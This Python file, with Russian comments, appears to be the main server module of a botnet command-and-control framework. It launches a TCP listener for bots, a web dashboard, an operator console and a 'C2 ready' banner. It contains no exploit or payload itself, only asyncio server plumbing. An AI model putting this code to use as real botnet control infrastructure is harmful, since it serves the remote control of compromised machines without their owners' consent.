# backend/Core/Server.py
import asyncio
import multiprocessing
import webbrowser
from logs import Log as logger
from backend import IP, PORT, API_PORT
from backend.API import run_fastapi_server
from .ClientConnection import client_handler
from backend.CLI.CLI import operator_interface, print_c2_ready_message
from backend import start_benchmark


async def start_server():
    # Очередь логов оставляем, так как Log Queue Listener
    # эффективно собирает записи из разных корутин
    log_queue = multiprocessing.Queue()

    # 1. Запуск основного TCP-сервера для ботов
    # Теперь мы не передаем push_socket, так как данные пойдут напрямую в API/Dispatcher
    server = await asyncio.start_server(
        lambda r, w: client_handler(r, w),
        IP, PORT,
        reuse_address=True,
        backlog=1000
    )

    addr = server.sockets[0].getsockname()
    logger.info(f"[+] Server started on {addr}")

    # 2. Задача для прослушивания очереди логов
    log_task = asyncio.create_task(logger.start_queue_listener(log_queue))

    # 3. Запуск FastAPI сервера (в той же очереди событий)
    api_task = asyncio.create_task(run_fastapi_server(IP, API_PORT))

    # 4. Запуск интерфейса командной строки (CLI)
    cli_task = asyncio.create_task(operator_interface(server))

    # 5. Бенчмарк производительности (мониторинг FPS/трафика)
    start_benchmark(asyncio.get_running_loop(), interval=1)

    # Автоматическое открытие панели управления в браузере
    webbrowser.open(f"http://{IP}:{API_PORT}/")
    logger.info("[+] Dashboard should open shortly in your browser.")

    # Вывод приветственного сообщения CLI
    print_c2_ready_message()

    async with server:
        try:
            # Собираем все задачи в один цикл.
            # Теперь всё работает в одном процессе, максимально быстро обмениваясь памятью.
            await asyncio.gather(
                server.serve_forever(),
                log_task,
                api_task,
                cli_task
            )
        except asyncio.CancelledError:
            logger.info("[*] Server shutdown initiated by user.")
        except Exception as e:
            logger.error(f"[!!!] Критическая ошибка в основном цикле сервера: {e}")
            raise
        finally:
            # Очистка при завершении
            logger.info("[*] Shutting down...")

            # Останавливаем логгер
            log_queue.put("STOP")

            # Отменяем задачи API и CLI
            api_task.cancel()
            cli_task.cancel()

            # Ждем корректного завершения задач
            await asyncio.gather(log_task, api_task, cli_task, return_exceptions=True)

            logger.info("[*] Server stopped.")